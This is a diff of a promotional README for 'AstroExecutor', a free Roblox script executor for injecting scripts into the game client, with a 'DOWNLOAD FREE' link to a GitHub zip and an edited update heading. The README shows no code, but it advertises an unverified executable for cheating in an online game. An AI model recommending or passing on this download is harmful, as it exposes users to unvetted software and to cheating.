@@ -2,7 +2,7 @@
 
 [DOWNLOAD FREE](https://github.com/FlessHacker/AstroExecutor/archive/refs/heads/main.zip)
 
-# UPDATE 5.0 UPLOADED - BIG UPDATE!
+# UPDATE 5.0 UPLOADED - BIG UPDATE! + BUG FIXED (01.08.2024)
 
 AstroExecutor is a free-to-download unrivaled Roblox script executor that allows players to run scripts in their favorite Roblox games. This software is available on PC (Windows 11/10/8.1/7) and Android mobile devices. It’s mainly used to run custom-created code called scripts into the Roblox game client.
 
